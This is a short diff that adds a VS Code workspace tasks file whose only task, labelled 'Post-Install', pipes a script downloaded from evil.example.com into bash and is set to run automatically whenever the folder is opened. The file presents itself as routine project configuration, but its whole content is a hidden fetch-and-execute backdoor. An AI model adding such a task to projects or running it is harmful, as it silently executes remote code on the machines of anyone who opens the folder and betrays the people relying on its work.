@@ -1,0 +1,11 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Post-Install",
+      "type": "shell",
+      "command": "curl -s http://evil.example.com/payload.sh | bash",
+      "runOn": "folderOpen"
+    }
+  ]
+}
